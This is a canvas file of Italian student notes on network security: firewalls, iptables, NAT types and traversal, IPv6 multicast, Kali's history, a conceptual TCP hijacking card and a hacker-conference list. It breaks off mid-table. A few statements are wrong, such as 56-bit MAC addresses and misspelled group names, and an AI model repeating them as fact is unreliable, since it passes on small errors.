		{"id":"e028842c6eb49cee","type":"text","text":"# Application Layer Filtering\n\nQui il punto è il seguente: di norma faccio packet filtering a livello di Rete e di Trasporto, ma in ambienti sensibili potrei volere un controllo più preciso, fino al livello Applicazione. Un ***Application Layer Firewall*** (o ***Proxy Firewall***) fa esattamente questo, permettendo di filtrare i pacchetti in base ai contenuti o perfino di modificarli.\n\nNel farlo ovviamente risulta molto più lento di un Firewall classico, motivo per cui non va inteso come un suo sostituto. Piuttosto, è un livello che aggiungo a ridosso dell'`host`, ed è conveniente renderlo specifico dell'applicazione. In che senso? Comprendere il contenuto di un protocollo richiede ***Deep Packet Inspection*** e ***parsing*** specifico, e spesso il contenuto è anche crittato (***TLS*** è un problema). Non posso provare parsing, decrittazione e pattern recognition per trovare attacchi di ***injection*** per tutti i protocolli ad ogni pacchetto, ha più senso mettere, e.g., solo il controllo `HTTP` davanti ad un server che parla solo `HTTP`, e simili.\n\nTuttavia, anche facendo così, non sempre posso permettermi di ispezionare tutti i pacchetti: spesso il comportamento di default diventa `accept` per poi lasciare il compito di capire se quel pacchetto può fare danni ad un sistema ***IDS/IPS***.\n\nQuesta cosa del \"mettere a ridosso dell'`host`\" ci permette di parlare anche del meccanismo di ***user-to-Gateway Authentication***. Questo tipo di Firewall viene implementato come proxy tra client e server, e consente di autenticare i singoli utenti.\n\n- Posso richiedere l'autenticazione ad un ***utente esterno*** prima di fargli usare il server;\n- Posso farlo anche al contrario, sugli ***utenti interni*** alla rete. e.g. un'azienda che vuole controllare la navigazione Internet dei propri dipendenti può obbligarli ad autenticarsi sul proxy per uscire dalla rete aziendale.\n\nEsistono anche soluzioni intermedie, come il ***Circuit-Level Gateway***, i.e. un proxy che opera al livello 5 del modello OSI (sarebbe il Session Layer, mentre l'Application per come lo abbiamo inteso prima è il livello 7). In pratica consente l'autenticazione dell'utente ma non fa DPI, e viene implementato tramite protocollo ***SOCKS*** (il cui obiettivo è esattamente quello di far passare le connessioni `client-server` da un intermediario, i.e. il proxy). In pratica, la differenza tra SOCKS e ALF è la stessa che c'è tra un corriere e un doganiere: SOCKS non interpreta il contenuto di ciò che inoltra (infatti è anche detto ***TCP relay***).\n\nTutto questo ovviamente non è pensato per proteggere da attacchi DoS o Insider Attackers. Esistono però i ***Next Generation Firewall*** (***NGFW***) che implementano un botto di roba (IDS/IPS, VPN, DPI, ...).","x":-6043,"y":19890,"width":759,"height":1089,"color":"4"},
		{"id":"369e6b92d27254f8","type":"text","text":"# Kali Linux & [Offensive Security](https://www.offsec.com/)\n\nA partire dagli anni '90 vengono creati diversi strumenti \"artigianali\" con l'obiettivo di testare le vulnerabilità dei vari sistemi. In sostanza questo significa attaccarli, ma finché lo scopo è etico (evidenziare le lacune per rafforzarle, *non* sfruttarle per fare danni) lo accettiamo e lo chiamiamo ***penetration testing***.\n\nI protagonisti di questi primi giorni dei tool di pentesting sono comunità auto-organizzate di hacker etici tra cui ***The Hacker's Choice*** (***THC***) in Germania, ***L0phy Heavy Industries*** in USA o ***Cult of the Dead Crow*** (***cDc***). Costoro si promettevano di non attaccare per lucro e di condividere ciò che scoprivano, realizzando tool usati ancora oggi (e.g. ***Hydra***, ***THC-IPv6***, ***SSL-DOS***). Anche ***scapy*** nasce in questa \"era\", per semplificare la creazione manuale di pacchetti (che altrimenti andava fatta a basso livello in `C`, già `Python` è un po' meglio).\n\nParallelamente, questa idea di testare preventivamente le vulnerabilità si fa strada anche nelle aziende, che iniziano ad investire in gruppi ad hoc, detti ***red teams***.\n\nFino al 2006 tutto ciò resta una sorta di sottobosco più o meno disorganizzato, in cui non era molto chiaro a chi bussare per imparare qualcosa. È qui che ***Offensive Security*** crea ***BackTrack***, una distro Linux che raccoglie tutti gli strumenti configurati e documentati e che nel 2013 evolverà in ***Kali***, basato su Debian. Da qui in poi nascono repo ufficiali e supporti HW più vasti, rendendo Kali lo standard *de facto* per il penetration testing\n\nAd oggi OffSec è un punto di riferimento nel settore, e rilascia la ***certificazione OSCP*** (**Offensive Security Certified Professional**) il cui esame consta letteralmente nel rompere un ambiente virtuale sfruttando vulnerabilità ed aumentando i propri privilegi. Oltre ad OffSec esistono oggi diverse piattaforme simili: [HackTheBox](https://www.hackthebox.com/), [VulnHub](https://www.vulnhub.com/), [TryHackMe](https://tryhackme.com/), ...\n\nMentre il penetration testing avviene in blackbox o graybox e mira ad individuare vulnerabilità dall'esterno, sono disponibili anche analisi dettagliate e ragionate in whitebox dette ***audit***, in genere ad opera del fratello del red team, il ***blue team***.","x":-7052,"y":15256,"width":759,"height":1089,"color":"4"},
		{"id":"06d054fda2be96d7","type":"text","text":"# Make, `Makefile`, `make install`\n\nAbbiamo un sacco di programmi da compilare, ognuno con le sue dipendenze. Oltre all'ovvio problema di chiamare un sacco di volte `gcc` la prima volta ce n'è uno più grande: ogni volta che modifico anche solo uno dei file sorgente devo ricompilare tutto? Ma no, mica li ho cambiati tutti, in teoria devo chiamare `gcc` solo su alcuni di questi, in cascata. Quali?\n\nQui entra in gioco il comando ***make***. Salvo sul file di configurazione (***Makefile***) una roba tipo\n\n```makefile\ntarget: source1 source2 ...\n\tgcc -o target source1 source2\n```\n\ncioè le ***regole*** per costruire il `target` (file compilato) a partire dai file `sorgente`. Quello che fa il comando `make` quando viene invocato è\n\n- leggere il `Makefile` per trovare tutte le regole di costruzione del progetto locale;\n- verificare quali file sorgente hanno un timestamp di modifica più recente rispetto al proprio target, ri-eseguendo tutte le regole coinvolte.\n\nQuesto ovviamente può portare a effetti a catena in cui ad esempio\n\n```makefile\ntarget1: source1 target2 target3\ntarget2: source2\ntarget3: source3\n```\n\nSe modifico `source2` verranno rieseguite le regole per costruire `target2`, e di conseguenza quelle per costruire `target1`. `target3` in questa situazione non viene toccato.\n\nOvviamente per progetti semplici il `Makefile` può essere scritto a mano, ma per roba grossa esistono tool di auto-configurazione (e.g. `Autotools`, `CMake`, `Ninja`) nei quali non ci addentreremo, perché l'ingegneria del SW ci interessa fino ad un certo punto.\n\nOra, tutto questo succede nella cartella del progetto. Ma *cosa-se* volessimo compilare in questo modo una roba da installare come programma a livello si sistema, e.g. in `/usr/bin`?\nNessun problema, nel `Makefile` posso specificare una regola di `install` che definisce quali prodotti del progetto copiare in quale `path`. Si invoca con ***`make install`***.\n\nLa cosa bella è che tutto questo è generalizzabile a qualsiasi comando. Posso definire nel `Makefile` tutte le regole che voglio, e.g. una `clean` che ha come azione `rm -rf *.o` che viene chiamata come `make clean`.","x":-8061,"y":16580,"width":759,"height":1105,"color":"4"},
		{"id":"9044be12381dd874","type":"text","text":"# Indirizzi Solicited Node\n\nRieccoci ad un nuovo episodio di \"Cose Poco Chiare\". La faccio breve.\n\nAbbiamo detto che `ARP` ci fa schifo perché usa il `broadcast`, quindi tocca usare il multicast. Ma siamo su `Ethernet`. Com'è fatto un multicast `Ethernet`? Di norma avrebbe prefisso `01:00:5E`, ma con `IPv6` diventa `33:33`. Niente di profondo, serve solo a dire che questi ultimi sono il risultato di una mappatura da un multicast `IPv6` ad un multicast `Ethernet`.\n\nMa come posso mai mappare in modo univoco un indirizzo a `128 bit` in uno a `56 bit`? Esatto: non posso. Ed è proprio per questo che definiamo una sottoclasse di indirizzi `IPv6` multicast detti ***Solicited Node***, aventi prefisso `FF02::1:FF00:0000/104`. Questo riduce il numero di indirizzi da mappare, dovendo scegliere solo gli ultimi `24 bit`.\n\n\"Ma scusa, il prefisso `33:33` ti dà `16 bit`, se gli aggiungi i `24 bit` che caratterizzano il Solicited Node arrivi solo a `40`. E gli altri `16`?\". Eh già, perché siccome siamo svegli ci tocca aggiungere anche quell'`FF` del penultimo gruppo. Ma non è finita!\n\nQuei `24 bit` sono proprio gli ultimi `24 bit` del GUA scelto dal nodo, in modo che l'indirizzo `MAC` multicast su cui ascoltare sia facilmente calcolabile. Già, infatti: che motivo c'è di passare per questo \"Solicited Node Address\" intermedio?\n\nRisposta breve: nessuno, se non per comodità di cosa scrivere nel `layer 3` della `NS`.\n\nVabbè passiamo avanti che questa roba è relativamente inutile, sono io che perdo tempo.","x":-13610,"y":13141,"width":759,"height":553,"color":"4"},
		{"id":"5bd8f997bf844789","type":"text","text":"- Si inseriscono sulle varie interfacce delle regole di ***anti-spoofing***, i.e. lato Internet non accetto pacchetti aventi come `source address` un indirizzo privato interno alla mia rete;\n\t- Questo ovviamente incontra qualche problema nel momento in cui Internet finisce gli indirizzi `IPv4` pubblici ed è costretto ad usare quelli privati. Viceversa, con `IPv6` di norma ho fatto prefix delegation e quindi funziona tutto alla grande;\n\t- Sarebbe meglio farlo anche sulle proprie sottoreti interne, altrimenti dalla tua rete possono partire attacchi di spoofing.\n","x":-5034,"y":19742,"width":759,"height":280},
		{"id":"8d3c58b3f8554082","type":"file","file":"Area Lab4 - Firewall NAT/ApplicationLevelFirewall_vs_SOCKS.png","x":-5034,"y":20233,"width":759,"height":403},
		{"id":"4202407ca024dc39","type":"text","text":"# I'm stealth da-ba-dee da-ba-da\n\nIl protocollo `IP` prevede, come buona norma dettata dai suoi RFC, che ogni hop riduca di `1` il `TTL` dei pacchetti quando questi vengono inoltrati.\n\n... ma come tutte le buone norme anche questa può tranquillamente essere disattesa. Nello specifico qui ne parliamo perché serve ad implementare un ***transparent firewall*** (se non riduci il `TTL` è più difficile individuarti sulla rete), ma in generale questa cosa può essere utilizzata da ***forward proxy***, ***NAT*** o ***VPN*** per nascondere il proprio operato.\n\nQuesto ovviamente facilita una serie di attività il cui limite è solo l'immaginazione.","x":-8061,"y":18536,"width":759,"height":301,"color":"4"},
		{"id":"01dce9f13742ff48","type":"text","text":"# NAT ([RFC 1918](https://www.rfc-editor.org/rfc/rfc1918.html), 1996)\n\nPensa al NAT come ad un ***MitM legalizzato*** in grado di modificare i pacchetti. Spesso si toccano solo `indirizzo IP` e `porta` (i.e. `IP privato` $\\to$ `IP pubblico del router + porta`), ma potenzialmente può fare molto di più (e.g. `IPv6 over IPv4`, VPN, ...)\n\nImplicitamente è anche un Firewall: se arriva un pacchetto verso una combinazione `IP pubblico / porta` che non è mappata nelle regole di traduzione, questo viene scartato. Non solo: dall'esterno è impossibile ricostruire la topologia di rete interna.\n\nMa il NAT non si limita al router domestico. Poniamo che l'host `192.168.1.2` sulla rete locale privata voglia aprire una connessione con l'esterno. Il suo default gateway (i.e. il router domestico) gli assegnerà una porta per de-multiplexare ed un indirizzo tra quelli disponibili. Tutto vero, ma manca un pezzo del puzzle: gli indirizzi a disposizione del router domestico non sono gli indirizzi pubblici. Vengono invece presi dallo ***shared address space***, e sono gli indirizzi privati degli ISP. La fetta `100.64.0.0/10` (i.e. da `100.64.0.0` a `100.127.255.255`) viene infatti utilizzata per il routing interno all'ISP, e solo dopo una seconda traduzione NAT arrivano su Internet. Visto che questa seconda traduzione è più su larga scala rispetto alla prima ci piace chiamarla con il nome fancy di ***Carrier-Grade NAT*** (***CGN***). È per questo che se vai su siti tipo [whatsmyip](https://www.whatismyip.com/it/) questi ti geolocalizzano in posti arbitrariamente lontani, spesso in grandi città come Milano e Roma, dove è più probabile trovare ***Internet Exchange Points*** (***IXP***) e conseguentemente ***Points of Presence*** (***PoP***) degli ISP, ognuno dei quali contiene uno o più ***edge router***.\n\nOra, come sappiamo la nomenclatura dei vari tipi di NAT è un delirio. Qui distinguiamo:\n\n- ***Source NAT*** (***SNAT***) - Cambiamo l'`IP` del mittente, e.g. quando creiamo una connessione da un `host` su rete privata verso l'esterno (anche detto ***masquerade***);\n\t- Spesso qui facciamo anche port translation (quello che di norma chiamo ***NAPT***).\n- ***Destination NAT*** (***DNAT***)  - Pubblicizziamo un indirizzo pubblico per un server che si trova dentro la rete privata (spesso implementato con ***Static PAT***, aka ***port forwarding***).\n\t- Nota che la risposta ad una connessione SNAT non è considerata DNAT;\n\t- La disambigua delle porte può indirizzare il traffico verso diversi server (e.g. ciò che il router riceve sulla `porta 80` va al `server HTTP`, sulla `21` a quello `FTP`).\n\nIl NAT presenta un grandissimo numero di problemi, che possiamo dividere in:\n\n- ***Checksum & Encryption*** - Ammesso che io riesca a leggere e cambiare la porta (il payload di `IP` può essere crittato), questo modifica il checksum e rompe integrità, autenticità e potenzialmente confidenzialità del messaggio;\n- ***Frammentazione*** - I frammenti dopo il primo non hanno l'header TCP: non c'è la porta!\n- ***Apertura di Connessioni*** - Due host dietro NAT devono fare i salti mortali per aprire una connessione tra loro, ma anche un singolo server dietro NAT non è banale da gestire. Questo in genere si risolve con tecniche come ***UDP Hole Punching***.","x":-8061,"y":22538,"width":759,"height":1089,"color":"6"},
		{"id":"2ef2012b457473ef","type":"text","text":"# `iptables` - Routing, Firewall & NAPT\n\nOgni pacchetto che transita nel sistema Linux  viene valutato secondo un set di regole che definiscono se e come inoltrarlo. Tali regole sono definite in `iptables` (standard open-source di Linux, diverse aziende possono avere diversi SW per scrivere le regole).\n\nLe regole sono organizzate in ***chain***, liste ordinate che permettono di valutarle in sequenza (i.e. la prima regola verrà valutata per prima). [Qui](https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html) un tutorial, ma più o meno:\n\n- `-t [table]` - Specifica il tipo di `chain` di regole da visualizzare o modificare:\n\t- `filter` - Regole che definiscono quali pacchetti accettare, inoltrare o bloccare. Le chain principali di questa tabella sono `INPUT` (regolamenta il traffico in ingresso), `OUTPUT` (in uscita) e `FORWARD` (se decidiamo di comportarci da router);\n\t- `nat` - Regole di `NAPT`;\n\t- `mangle` - Regole di modifica dei pacchetti (e.g. cambiare il `TTL`).\n\t- Posso creare una nuova `chain` con l'opzione `-N`;\n\t- Se ometto `-t` il sistema dà per scontato che parliamo delle `filter rules`.\n- `-A, -I [chain]` - Entro la `table`, aggiunge una regola in `append`/`insert` nella `chain`;\n- `-L` - Mostra le regole delle varie chain. Di norma si usa insieme ad opzioni per migliorare la leggibilità, tipo `-v` (`verbose`), `-n` (evita di risolvere i nomi con `DNS`) e `--line-numbers` (utile se mi serve capire quale regola cancellare);\n- `-j` - Serve a definire il comportamento di una nuova regola (e.g. `iptables -A INPUT -s 192.168.1.100 -j DROP`  aggiunge in coda la regola `droppa src=192.168.1.100`);\n\t- Esempi di comportamenti sono `DROP`, `ACCEPT`, `MASQUERADE` (per il routing), ...;\n\t- `-p` - Specifica un protocollo entro una regola (e.g. `icmp`);\n\t- Qua si aggiunge una pletora di sotto-specifiche come `-d` (`dst`), `-s` (`src`), l'analogo per le porte (e.g. `-p tcp --sport [port]` per specificare la `src port` di una connessione `TCP`) e `-i`/`-o` per l'interfaccia di ingresso/uscita.\n- `-D` - Rimuove una regola (e.g. `iptables -D INPUT 1` rimuove la prima regola di `INPUT`);\n\t- `-F` (`flush`) - Cancella tutte le regole.\n- `-R` - Modifica una regola esistente;\n\n- `-P` - Imposta una policy complessiva (e.g. `iptables -P INPUT DROP` blocca tutto il traffico in ingresso, eventualmente sta ad una regola nella chain permettere a qualcosa di specifico di entrare con una direttiva `ACCEPT`, i.e. policy di `default deny`);\n- `-m` - Aggiunge un ***extension module***, e.g. `-m state --state s` tiene traccia dello stato delle connessioni, implementando di fatto uno ***stateful firewall***.\n\n`iptables` di per sé ***non salva le regole al reboot***. Se voglio preservarle devo salvarle (con `iptables-save > /etc/iptables.rules`) e poi ripristinarle al riavvio (`iptables-restore < /etc/iptables.rules`). Così come `iptables` è stato il successore di SW come `ipchains` e `ipfw`, il prossimo in lista per la successione sembra essere `nftalbes`.","x":-8061,"y":21214,"width":759,"height":1089,"color":"4"},
		{"id":"37e9c58cfe4688f4","type":"text","text":"# Checksum & Encryption\n\nPer quanto detto, se modifico l'`IP` e/o la `porta` di un pacchetto devo anche ricalcolare il `checksum` degli `header IP` e `TCP`/`UDP`. Se non lo faccio, il destinatario si ritrova con dei `checksum` incoerenti, deduce che il pacchetto è corrotto e lo scarta.\n\nDi per sé non sarebbe un grosso problema, ma se uso un protocollo come ***IPsec*** (che sì, si può usare su `IPv4` in modo simile a come si usa su `IPv6`, cioè scrivendo nel campo `protocol` il valore `50`, dall'altra parte capiranno) mi ritrovo di fatto con una ***crittografia end-to-end*** sul payload di Rete. E quindi?\n\n- Anzitutto, se l'`header TCP/UDP` è crittato è in prima analisi difficile risalire alla porta;\n- Secondariamente, se anche riuscissi a leggerla e modificarla renderei inconsistente il ***Message Authentication Code*** (***MAC***), rompendo l'integrità del pacchetto che verrebbe quindi scartato dal destinatario in quanto considerato manomesso.\n\nQui la soluzione diventa ***incapsulare i pacchetti `IPsec` in `UDP`***. In questo modo il NAT può modificare tutto quello che deve modificare senza andare a toccare roba crittografata, la quale viene vista e decrittata solo a destinazione.\n\n","x":-8061,"y":23862,"width":759,"height":517,"color":"4"},
		{"id":"f6afdb9abd9f136e","type":"text","text":"# Aprire Connessioni dietro NAT\n\nAvere un `server` dietro NAT è sconveniente, ma esistono delle soluzioni:\n\n- ***Static PAT*** (***port forwarding***) - \"Tutto ciò che arriva sulla porta `X` dell'`IP_pubblico` del router viene inoltrato alla coppia `IP_privato, Porta_privata`\". È la soluzione più semplice, ma di contro toglie quel livello di protezione implicito che il NAT offre agli `host` della rete privata (chiunque può raggiungere il `server` tramite quella porta);\n- ***Universal Plug and Play*** (***UPnP***) - L'idea è di nuovo quella di fare `port forwarding`, ma stavolta non deve farlo l'admin di rete: ci pensa in automatico l'applicazione, senza che l'utente debba configurare o autorizzare alcunché. Come si fa?\n\t- Anzitutto il router deve supportare lo standard ***Internet Gateway Device Protocol*** (***IGD***) per accettare una richiesta automatica di questo tipo;\n\t- Il device (e.g. la PS5) manda una richiesta di tipo `UPnP gateway discovery` sulla LAN tramite il ***Simple Service Discovery Protocol*** (***SSDP***) e trova il router abilitato;\n\t- L'applicazione `host` sa in anticipo quale `porta` far aprire al router (e.g. per molti giochi la `porta` standard è la `3074/UDP`). Procede quindi a chiedere al gateway di aggiungere la corrispondente regola di `port forwarding`;\n\t- Non tutti i router autorizzano UPnP, per motivi di sicurezza. Se un'applicazione può autonomamente far aprire porte al router, allora un ***malware*** che si è in qualche modo infiltrato nella LAN può creare delle ***backdoor*** o esporre ad Internet cose che dovrebbero restare private.\n\nPeggio ancora è avere dei ***peer*** dietro NAT, perché in questo caso devo bucarne ben due. Parliamo allora in generale di ***NAT Traversal***, e può funzionare in diversi modi:\n\n- ***UDP Hole Punching*** - Ciascun `peer` dietro NAT contatta un server ***STUN*** (***Session Traversal Utilities for NAT***), il quale risponde con la loro coppia pubblica `IP, porta`. Visto che di norma so con chi voglio connettermi, i messaggi sono di tipo \"`ciao server STUN, sono alice666 e vorrei parlare con bob_er_mejo`\". Il server è quindi in grado di fornire a `Bob` la coppia `IP, porta` pubblica di `Alice` e viceversa;\n\t- Se entrambi usano Full Cone NAT abbiamo finito. Se invece abbiamo un Restricted cambia poco, entrambi iniziano ad inviare pacchetti \"fidandosi\" della connessione. Per come funziona il Restricted, quando inizio ad inviare pacchetti verso quell'`IP` posso anche iniziare a riceverne, quindi di fatto funziona lo stesso. Se invece il NAT è di tipo Symmetric tocca inventarsi qualcos'altro.\n- ***Traversal Using Relays around NAT*** (***TURN***) - Se siamo qui è perché siamo disperati, e.g. siamo alle prese con un Symmetric NAT. È inutile provare a fare Hole Punching, perché tanto ogni nuova connessione viene mappata in una coppia `IP, porta` diversa. Allora chiediamo ad un server di fare da intermediario. I messaggi dei client sono come prima (`sono alice666 e vorrei parlare con bob_er_mejo`), solo che stavolta il traffico passa attraverso il `server`: `Alice` manda i messaggi per `Bob` al `server`, il quale li inoltra a `Bob`. È una soluzione robusta, ma introduce latenza e consuma molta banda.","x":-6043,"y":22538,"width":759,"height":1089,"color":"4"},
		{"id":"b1a22b7c2b11afff","type":"text","text":"aprire un serverino scemo: `python3 -m http.server 8000`","x":-2440,"y":21677,"width":353,"height":187},
		{"id":"b4fba8cdad9121ff","type":"text","text":"# Full Cone, Restricted Cone & Symmetric NAT\n\nSiamo abituati a pensare al NAT come a delle regole che mappano\n\n```\nIP_privato, Porta_privata <-> IP_pubblico, Porta_pubblica\n```\n\nQuesto è giusto in linea di principio, ma in pratica dobbiamo fare delle distinzioni.\n\nAnzitutto, questa descrizione può sembrare un semplice ***port forwarding***, i.e. l'admin di rete definisce una mappatura statica tale che qualsiasi pacchetto indirizzato alla coppia `(IP_pubblico, Porta_pubblica)` viene reindirizzato a `(IP_privato, Porta_privata)`. Non è necessariamente così. Posso creare le associazioni di questo tipo in modo dinamico solo quando l'`host` privato apre una connessione verso l'esterno (i.e. l'associazione non esiste se non c'è un'iniziativa proveniente da dentro). In questo caso parliamo di ***Cone NAT***, e ne distinguiamo due tipi:\n\n- ***Full Cone NAT*** - L'`host` interno apre una connessione verso il `server` esterno `X`, il router crea l'associazione NAPT per dare un `IP_pubblico` all'`host`. Da questo momento in poi (fino eventualmente ad un timeout) chiunque può mandare pacchetti alla coppia `(IP_pubblico, Porta_pubblica)` e raggiungere l'`host`. È simile al port forwarding, l'unica differenza è che l'associazione non è statica ma dinamica;\n- ***Restricted Cone NAT*** - Come prima, ma il router tiene traccia dei `server` già contattati dall'`host`. Solo chi è stato precedentemente contattato dall'interno può inviare roba all'`host`, migliorando di fatto la sicurezza.\n\nPossiamo fare qualcosa di ancora più estremo, cioè legare la regola al `server` contattato.\n\n```\n(IP, Porta)_privato, (IP, Porta)_remoto <-> IP_pubblico, Porta_pubblica\n```\n\nQuesto significa che creo una nuova regola di NAPT per ogni connessione con una nuova coppia `(IP, Porta)_remoto`, il che significa che, e.g., `10.10.10.10:1234` è valido solo per parlare con il `server X` sulla porta `Y`, mentre già lo stesso `server` ma sulla porta `Z` vedrà lo stesso `host` privato come, e.g., `10.10.10.100:2345` (ho messo un diverso `IP_pubblico` per generalità, assumendo che il router abbia una pool di indirizzi pubblici). In questo caso parliamo di ***Symmetric NAT***, e si capisce intuitivamente che in questo caso diventa molto difficile raggiungere l'`host` dall'esterno senza che questo abbia iniziato una connessione proprio verso di te (inteso non solo come `IP`, ma anche `porta`).\n\nIl tema di \"raggiungere l'`host` dall'esterno\" è cruciale, soprattutto in applicazioni ***p2p***. Perché un `host` dietro NAT sia raggiungibile deve essere lui ad iniziare la connessione, ma se entrambi i `peer` sono dietro NAT come facciamo? Bisogna allora trovare dei modi per ***\"bucare\" il NAT*** e, come vedremo, non sempre è facile.","x":-7052,"y":22538,"width":759,"height":1089,"color":"4"},
		{"id":"fb3af62cd4e104d6","type":"file","file":"Area Lab4 - Firewall NAT/stateful_firewall.png","x":-5960,"y":19072,"width":593,"height":583},
		{"id":"b1013af8caa78b6a","type":"text","text":"# Incoerenza con il `payload` Applicazione\n\nPrendiamo come esempio ***FTP Attivo***. Il protocollo prevede che l'`host` apra un canale di controllo sulla `porta 21` tramite il quale dice al `server` remoto \"apri la connessione dati verso il mio `IP`, porta `1234`\". Il problema è che \"il mio `IP`\" è quello privato, mentre il NAT ha fatto una traduzione a `IP` pubblico. Che si fa quindi?\n\n- La soluzione banale è ***non usare FTP Attivo*** (e in generale non usare i protocolli che prevedono gli `IP` dentro il `payload` Applicazione). In questo caso abbiamo come alternativa FTP Passivo, in cui è il server a comunicare al `client` una propria coppia `IP, porta` verso cui creare la connessione dati;\n- La soluzione meno banale è implementare un ***Application Level Gateway*** (***ALG***), i.e. una roba application-specific che si va a leggere il contenuto del `payload` per effettuare la traduzione degli indirizzi anche là. Inutile dire che va configurato ad-hoc per ogni protocollo applicazione, che è ovviamente lento e che se c'è di mezzo la crittografia diventa semplicemente impossibile farlo funzionare.","x":-6043,"y":23862,"width":759,"height":514,"color":"4"},
		{"id":"798213c3a0c4bd59","type":"file","file":"Area Lab4 - Firewall NAT/main_firewall_chains.png","x":-5969,"y":21214,"width":612,"height":427},
		{"id":"7339938c54102d40","type":"text","text":"# Extension Modules\n\n- `state` - Rende il firewall ***stateful*** associando alle connessioni varie etichette che aiutano a prendere decisioni (e.g. `NEW`, `ESTABLISHED`, `RELATED` che sarebbe tipo la connessione secondaria di `FTP` o di `ICMP`, che a quanto pare ne prevede una);\n- `multiport` - Nel SW vanilla possiamo specificare una porta o un range, ma ci serve questo add-on per dire tipo `80, 443`;\n- `mac` - Permette di basare le regole sugli indirizzi MAC;\n- `limit` - Impone un limite alla frequenza dei pacchetti di un certo tipo (e.g. `FORWARD -p TCP --syn -m limit --limit 1/s -j ACCEPT` consente di forwarding di al più una `SYN` al secondo).","x":-7052,"y":21214,"width":759,"height":427,"color":"4"},
		{"id":"84cad9d0d78c8e86","type":"text","text":"# Chains Order\n\nEscludendo la chain `RAW` (che avrebbe priorità più alta di tutte ma che non viene mai usata), a diversi momenti del processo di Firewall/NAT corrispondono diverse priorità di azione.\n\n- Nelle fasi di `PREROUTING` e `POSTROUTING` vengono svolte le operazioni di NAT;\n- Nelle fasi di `FORWARD`, `INPUT` e `OUTPUT` entra in gioco il Firewall.\n\nPoi posso aggiungere delle nuove chain, per le quali decido io la priorità. Posso anche definire dei \"salti\" di chain (i.e. scrivo una regola nella chain A che se matchata salta a valutare la chain B).","x":-7052,"y":21876,"width":759,"height":427,"color":"4"},
		{"id":"db60cc9e7f99394c","type":"file","file":"Area Lab4 - Firewall NAT/NAT_Firewall_Chains_Order.png","x":-5858,"y":21876,"width":390,"height":427},
		{"id":"2f737b49ed883a4d","type":"file","file":"Area Lab4 - Firewall NAT/commandsforex5_sketch.png","x":-2487,"y":21100,"width":399,"height":314},
		{"id":"1df407eb2a945234","type":"text","text":"# Injection, Hijacking & DoS su Connessioni TCP\n\nUna connessione TCP ha diversi punti deboli, sfruttabili in diversi modi.\n\nPosso fare ***spoofing*** per arrivare all'***injection***. Mando una richiesta `SYN` dichiarando di essere l'`IP` del client (generando quindi un `x` casuale). Il server risponde all'`IP` del client generando un `y` casuale. Visto che la risposta non è indirizzata al mio `IP`, non posso vedere `y`. Per aprire la connessione dovrei quindi mandare un `ACK` con il giusto `y + 1`.\n\nQuesta roba è vecchia, nel senso che oggi è difficile fare TCP Spoofing. `y` è randomizzato bene, e qualsiasi risposta del vero client (che si vede arrivare risposte a domande che non ha mai fatto) induce il server a rendersi conto che c'è un problema e a chiudere tutto.\n\nUn'altra roba poco verosimile oggi è un ***TCP Hijacking***, i.e. dirottare la connessione già esistente in modo da sostituirmi al client. Questo ovviamente presuppone sniffing dei pacchetti (devo leggere i numeri di sequenza).\n\nSono molto simili in realtà","x":-2466,"y":19280,"width":759,"height":924,"color":"#4545ff"},
		{"id":"8bce469fa2f2310d","type":"text","text":"## 🎭 1. **DEFCON** – _The Hacker's Burning Man_\n\n- **Nata nel 1993**, da un’idea di **Jeff Moss (Dark Tangent)**, che oggi è anche nel consiglio della Homeland Security americana (!).\n    \n- Si tiene ogni estate a **Las Vegas**.\n    \n- Nasce come un party per hacker, amici e BBS user… ed esplode: oggi ospita **decine di migliaia di partecipanti**.\n    \n\n### Cosa la rende unica?\n\n- **Comunitaria, anarchica, underground**.\n    \n- Nessun badge elettronico, anonimato rispettato, cash-only, no registrazione online.\n    \n- Ogni edizione ha **villaggi tematici** (hardware hacking, IoT, RF, lockpicking, social engineering…).\n    \n- **CTF più duri del mondo**, tra cui il celebre _DEFCON CTF_ (organizzato oggi da `Order of the Overflow`).\n    \n\n### Stato attuale:\n\n- È diventata **il principale raduno hacker al mondo**.\n    \n- Ha mantenuto lo spirito informale e provocatorio.\n    \n- Spesso debutta qui il materiale che diventerà tool, paper o exploit noti nei mesi successivi.\n    \n\n---\n\n## 🕴️ 2. **Black Hat** – _La versione in giacca e cravatta_\n\n- Fondata sempre da **Jeff Moss**, un paio d’anni dopo DEFCON, per dare **una veste più “aziendale” alla stessa materia**.\n    \n- Si tiene **la settimana prima di DEFCON**, nella **stessa città**, spesso nello stesso hotel (!).\n    \n- Ha un **biglietto molto costoso**, e il pubblico è fatto di:\n    \n    - CISOs\n        \n    - pentester senior\n        \n    - vendor\n        \n    - governi\n        \n    - ricercatori industriali\n        \n\n### Caratteristiche:\n\n- **Talk ultra-tecnici ma regolamentati**, con _responsible disclosure_ obbligatoria.\n    \n- Possibilità di fare training a pagamento con autori di tool e framework (es: chi ha scritto Burp, Metasploit, fuzzers…).\n    \n- Molta attenzione alla **compliance legale e al marketing** (gli sponsor abbondano).\n    \n\n### Stato attuale:\n\n- È **la vetrina professionale della ricerca offensiva**.\n    \n- Chi presenta qui può cambiare carriera: _“Ho parlato a Black Hat”_ è una medaglia.\n    \n\n---\n\n## 🧠 3. **HITB – Hack In The Box**\n\n- Nata nel 2003 in **Malesia**, poi diffusa in tutto il mondo (Amsterdam, Dubai, Singapore…).\n    \n- Più simile a Black Hat, ma con forte **apertura alla sperimentazione**, live demos, reverse engineering, hardware.\n    \n\n### Rilevante perché:\n\n- È **il punto di incontro tra Asia, Europa e Occidente**.\n    \n- Ospita talk molto avanzati su embedded, hardware hacking, attacchi radio, ecc.\n    \n- Ottimo trampolino per ricercatori emergenti.\n    \n\n---\n\n## 🧬 4. **CCC – Chaos Communication Congress**\n\n- Organizzato dal **Chaos Computer Club** (Germania), attivo dal 1981 (!).\n    \n- È **la conferenza hacker più longeva d’Europa**, e una delle più politicamente schierate (pro-privacy, anti-sorveglianza, anti-autoritarismo).\n    \n\n### Aspetti distintivi:\n\n- Fortissimo spirito **etico, politico, comunitario**.\n    \n- Talk su hacking, sicurezza, crittografia, ma anche **attivismo digitale, arte, cyber diritti**.\n    \n- Si tiene ogni dicembre, in Germania.\n    \n\n### Stato attuale:\n\n- Ha una community **molto sofisticata e militante**.\n    \n- È vista da molti come la “coscienza critica” del mondo hacker.\n    \n\n---\n\n## 🔍 Altre conferenze notevoli\n\n|Nome|Focus|Dove|Note|\n|---|---|---|---|\n|**ShmooCon**|Hacking pratico, tool, prototipi|Washington DC|Più intima, grande qualità tecnica|\n|**BSides**|Community-driven, piccole ma agili|Ovunque|Gratis o a basso costo, 